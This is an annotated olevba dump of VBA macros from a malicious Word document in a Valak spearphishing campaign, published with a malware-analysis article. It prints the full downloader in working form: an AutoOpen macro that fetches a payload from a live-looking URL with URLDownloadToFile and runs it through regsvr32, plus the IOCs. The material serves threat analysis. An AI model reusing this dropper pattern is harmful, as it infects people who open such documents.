@@ -1,0 +1,140 @@
+# doc-vba-dump-raw.txt
+# Part of the following article: https://chris.partridge.tech/2020/anatomy-of-a-valak-distributing-email/the-campaign/
+# Published: June 1, 2020
+#
+# Tidied up & annotated VBA scripts included in a malicious .doc file as part of a Valak spearphishing campaign.
+# License: CC BY 2.0, ref: https://creativecommons.org/licenses/by/2.0/legalcode
+
+olevba 0.55.1 on Python 3.8.2 - http://decalage.info/python/oletools
+tidied up manually by Chris Partridge https://chris.partridge.tech
+===============================================================================
+FILE: documents_05.20.doc
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO s.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/s'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function H()
+
+End Function
+Function k()
+
+Dim arr(8) As String
+
+' normally these are "obfuscated" with '100%' strings which are then removed later with Ka.t Ej("", 0), Ej("100%", 1)
+' so we just remove all of the bullshit & concatenate these for great justice
+' but it's still nice to see malware authors keeping it 100% :triumph:
+arr(0) = "http://p57zu1p9b3au2w6ghu."
+arr(1) = "com/urvave/cennc.php?l=haa"
+arr(2) = "o9.cab=====c:\programdata"
+arr(3) = "\26163563.dat"
+' result: http://p57zu1p9b3au2w6ghu.com/urvave/cennc.php?l=haao9.cab=====c:\programdata\26163563.dat
+
+k = arr
+End Function
+Function Ej(yH, H3)
+F1 = k
+
+qY = Join(F1, "")
+
+qY = Replace(qY, yH, "")
+
+' then split your download URL from the target file
+F1 = Split(qY, "=====")
+' download: http://p57zu1p9b3au2w6ghu.com/urvave/cennc.php?l=haao9.cab
+' target:   c:\programdata\26163563.dat
+
+Select Case H3
+Case 0
+Ej = F1(0)
+Case 1
+Ej = F1(1)
+Case Else
+Debug.Print "qY"
+End Select
+End Function
+Sub AutoOpen()
+
+Dim Ka As New C
+
+' does nothing since we already removed '100%' strings prior
+Ka.t Ej("", 0), Ej("100%", 1)
+
+Dim XT As New r7
+
+' executes second stage payload at c:\programdata\26163563.dat with regsvr
+Call XT.be("regsvr" & 32 & " " & Ej("", 1))
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO C.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/C'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+#If VBA7 And Win64 Then
+Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
+Alias "URLDownloadToFileA" ( _
+ByVal pCaller As LongPtr, _
+ByVal szURL As String, _
+ByVal szFileName As String, _
+ByVal dwReserved As LongPtr, _
+ByVal lpfnCB As LongPtr _
+) As Long
+#Else
+Private Declare Function URLDownloadToFile Lib "urlmon" _
+Alias "URLDownloadToFileA" ( _
+ByVal pCaller As Long, _
+ByVal szURL As String, _
+ByVal szFileName As String, _
+ByVal dwReserved As Long, _
+ByVal lpfnCB As Long _
+) As Long
+#End If
+Private Sub Class_Initialize()
+
+End Sub
+Private Sub Class_Terminate()
+
+End Sub
+Public Sub t(vl, Jo)
+
+
+URLDownloadToFile 0, vl, Jo, 0, 0
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO r7.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/r7'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function be(OB)
+
+Dim w7 As New WshShell
+w7.exec OB
+End Function
+Function E(Zh)
+    
+
+End Function
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|Suspicious|exec                |May run an executable file or a system       |
+|          |                    |command using Excel 4 Macros (XLM/XLF)       |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|Lib                 |May run code from a DLL                      |
+|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Hex String|'=*'                |FCFB3D2A                                     |
+|Hex String|'\x08\x00+3q'       |08002B3371B5                                 |
+|IOC       |http://p57zu1p9b3au2|URL                                          |
+|          |w6ghu.com/urvave/cen|                                             |
+|          |nc.php?l=haao9.cab  |                                             |
+|IOC       |c:\programdata\26163|Executable file name                         |
+|          |563.dat             |                                             |
++----------+--------------------+---------------------------------------------+
+
